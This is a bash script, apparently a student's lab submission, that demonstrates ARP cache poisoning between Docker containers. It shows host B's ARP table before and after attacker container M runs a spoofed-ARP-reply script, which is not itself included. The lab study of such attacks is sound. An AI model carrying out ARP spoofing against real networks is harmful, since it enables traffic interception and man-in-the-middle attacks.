#!/bin/bash
# Task 1.B -- ARP cache poisoning using a spoofed ARP reply (from M).
set -u
cd "$(dirname "$0")" || exit 1

read -p "Enter weekly code (e.g. WK01-ASDK): " WK

wk() {
  local G=$'\033[01;32m' B=$'\033[01;34m' R=$'\033[00m'
  local PROMPT_DIRTRIM; PROMPT_DIRTRIM=$(sed -n 's/^[[:space:]]*PROMPT_DIRTRIM=\([0-9]\+\).*/\1/p' ~/.bashrc 2>/dev/null | tail -1)
  local w='\w'; w="${w@P}"
  printf '[%s]%s%s@%s%s:%s%s%s$ echo %s\n' "$(date +%D)" "$G" "$(whoami)" "$(hostname)" "$R" "$B" "$w" "$R" "$WK"
  echo "$WK"
}

docker exec B-10.9.0.6 ip neigh del 10.9.0.5 dev eth0 2>/dev/null
docker exec B-10.9.0.6 ping -c 1 10.9.0.5 >/dev/null 2>&1
docker exec B-10.9.0.6 ip neigh change 10.9.0.5 nud stale dev eth0 2>/dev/null
echo "B's ARP cache before attack (10.9.0.5 = A's real MAC 02:42:0a:09:00:05):"
docker exec B-10.9.0.6 arp -n

echo
echo "M sends a spoofed ARP reply (10.9.0.5 is at M's MAC) to B:"
sleep 2   # let B's entry age past the ARP locktime (~1s) so the reply can override it
docker exec -i M-10.9.0.105 python3 - < arp_reply.py

echo
echo "B's ARP cache after attack (10.9.0.5 should now be M's MAC 02:42:0a:09:00:69):"
docker exec B-10.9.0.6 arp -n
wk
